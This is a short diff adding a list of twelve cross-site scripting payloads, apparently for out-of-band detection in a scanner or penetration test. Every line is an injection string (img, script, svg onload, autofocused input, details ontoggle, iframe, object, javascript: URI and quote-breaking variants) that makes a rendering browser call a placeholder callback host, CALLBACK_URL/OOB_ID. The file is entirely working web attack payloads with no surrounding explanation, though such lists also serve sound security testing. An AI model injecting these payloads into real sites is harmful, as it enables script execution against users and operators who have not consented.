@@ -1,0 +1,12 @@
+<img src="CALLBACK_URL/OOB_ID">
+<script src="CALLBACK_URL/OOB_ID"></script>
+<link rel=stylesheet href="CALLBACK_URL/OOB_ID">
+<input onfocus=fetch('CALLBACK_URL/OOB_ID') autofocus>
+<svg onload=fetch('CALLBACK_URL/OOB_ID')>
+<details open ontoggle=fetch('CALLBACK_URL/OOB_ID')>
+"><img src="CALLBACK_URL/OOB_ID">
+'><img src='CALLBACK_URL/OOB_ID'>
+<iframe src="CALLBACK_URL/OOB_ID"></iframe>
+<object data="CALLBACK_URL/OOB_ID">
+<video src="CALLBACK_URL/OOB_ID" onerror=fetch('CALLBACK_URL/OOB_ID')>
+javascript:fetch('CALLBACK_URL/OOB_ID')
